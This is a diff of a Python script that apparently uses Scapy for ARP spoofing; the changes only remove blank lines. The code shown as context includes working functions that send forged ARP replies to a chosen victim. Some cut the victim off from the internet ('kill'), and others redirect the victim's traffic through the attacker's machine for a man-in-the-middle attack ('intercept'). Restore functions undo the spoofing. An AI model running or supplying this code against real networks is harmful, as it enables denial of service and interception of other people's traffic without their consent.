@@ -77,10 +77,8 @@ def getMac(victim_ip, interface):
 
 def poison(victim_ip, victim_mac, gateway_ip):
     # send the victim an ARP packet pairing the gateway ip with the wrong mac address
-
     packet = ARP(op=2, psrc=gateway_ip, hwsrc="12:34:56:78:9A:BC", pdst=victim_ip, hwdst=victim_mac)
     send(packet, verbose=0)
-
 
 def restorePoision(victim_ip, victim_mac, gateway_ip, gateway_mac):
     # send the victim an ARP packet pairing the gateway ip with the correct mac address
@@ -91,13 +89,11 @@ def restorePoision(victim_ip, victim_mac, gateway_ip, gateway_mac):
 
 def mitm(victim_mac, gateway_mac, victim_ip, gateway_ip, interface):
     # send the victims an ARP packet pairing the gateway ip with the wrong mac address
-
     send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac))
     send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac))
 
 def restoreMitm(victim_ip, victim_mac, gateway_ip, gateway_mac):
     # send the victims an ARP packet pairing the gateway ip with the correct mac address
-
     print("Restoring Targets...")
     send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=CONST_MAC_ADDRESS_CLEAN_PATTERN, hwsrc=victim_mac), count=7)
     send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=CONST_MAC_ADDRESS_CLEAN_PATTERN, hwsrc=gateway_mac), count=7)
@@ -129,7 +125,6 @@ def kill(the_hosts, user_choice):
     victim_mac = the_hosts[user_choice][1]
 
     # loop the poison function until we get a keyboard inturrupt (ctl-c)
-
     print("Preventing {} from accessing the internet...".format(the_hosts[user_choice]))
     try:
         while True:
@@ -146,7 +141,6 @@ def intercept(the_hosts, user_choice):
     victim_mac = the_hosts[user_choice][1]
 
     # loop the spoof function until we get a keyboard inturrupt (ctl-c)
-
     print("MITM attack {} to your machine...".format(the_hosts[user_choice]))
 
     try:
